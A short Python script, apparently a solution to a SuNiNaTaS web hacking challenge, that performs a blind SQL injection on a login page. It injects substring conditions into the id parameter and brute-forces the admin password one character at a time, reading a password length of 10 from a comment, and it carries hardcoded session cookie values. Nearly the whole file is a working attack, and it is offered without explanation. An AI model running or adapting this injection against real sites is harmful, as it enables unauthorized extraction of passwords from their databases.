import requests

#length of pw: id에 admin' and len(pw)=10-- 

host = "http://suninatas.com"

id_payload = "admin' and substring(pw,1,1)='a'--"

fullstring=""

for i in range(1,11):
    id_payload = id_payload[:24] + str(i) + id_payload[25:]
    for j in range(33,127):
        if i==10 :
            id_payload = id_payload[:31] + chr(j) + id_payload[32:]
        else:
            id_payload = id_payload[:30] + chr(j) + id_payload[31:]
        #print(id_payload)
        payload = {'id': id_payload , 'pw': '1'}
        headers = {'_ga':"GA1.2.941365865.1636961682",'_gid':"GA1.2.1404486221.1636961682",'ASPSESSIONIDAADSRDRA':"KOONEOMAMFADCOENJJKLJEPF", 'auth_key':"%3F%3F%3F%3F%3F", 'ASPSESSIONIDCSTCRCQA': "CFOBMOBBDMKHMAFILNAIICBH", 'ASP.NET_SessionId':"bigp00uojzatxatcxg0ni3mb"}
        r = requests.get(host+"/challenge/web22/web22.asp",headers=headers, params=payload)
        #print(r.content)

        if (r.text.find('OK')) != -1:
            fullstring+=chr(j)
            print(fullstring)
            break
